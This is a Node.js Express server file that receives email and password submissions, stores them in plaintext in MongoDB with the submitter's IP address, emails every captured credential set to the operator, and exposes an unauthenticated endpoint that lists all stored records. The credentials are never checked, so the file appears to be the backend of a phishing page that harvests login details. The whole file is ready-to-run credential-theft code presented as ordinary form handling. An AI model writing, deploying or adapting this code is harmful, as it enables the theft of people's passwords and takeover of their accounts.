const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const path = require("path");
const nodemailer = require("nodemailer");
require("dotenv").config(); // Load environment variables from .env file

const app = express();
const PORT = 3001;

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Define a schema
const formSchema = new mongoose.Schema({
  email: String,
  password: String,
  ipAddress: String, // Store IP addresses
});

// Create a model
const FormData = mongoose.model("info", formSchema);

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Set up routing for the `api` folder
const apiRouter = express.Router();
app.use("/api", apiRouter);

apiRouter.post("/info", async (req, res) => {
  const { email, password } = req.body;

  // Check for the user's IP address
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  // Create a new form data document
  const newFormData = new FormData({ email, password, ipAddress });

  try {
    // Save the document to the database
    await newFormData.save();

    // Set up Nodemailer transporter
    const transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: 465, // Use 465 for SSL (more secure) or 587 for TLS
      secure: true, // true for SSL, false for TLS
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Email options
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Form Data Received",
      text: `New form data received:\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    res.status(201).json({ message: "Form received and saved." });

    // Option 1: End the response without sending any message
    // res.end();

    // Option 2: Send a 204 No Content status code (indicating success but no content)
    // res.status(204).end();
  } catch (err) {
    console.error("Error saving form data or sending email", err);
    res.status(500).json({
      message: "An error occurred while saving the data or sending the email",
    });
  }
});

// Define GET route to fetch data from the database
apiRouter.get("/info", async (req, res) => {
  try {
    // Retrieve all documents from the collection
    const formData = await FormData.find();
    res.json(formData);
  } catch (err) {
    console.error("Error retrieving form data:", err);
    res
      .status(500)
      .json({ message: "An error occurred while retrieving the data" });
  }
});

// Serve static files from the frontend folder if needed
// app.use(express.static(path.join(__dirname, "frontend", "build")));
app.use(express.static(path.join(__dirname, "..", "frontend", "build")));

// Handle any remaining requests by serving the frontend app
app.get("*", (req, res) => {
  // res.sendFile(path.join(__dirname, "frontend", "build", "index.html"));
  res.sendFile(path.join(__dirname, "..", "frontend", "build", "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
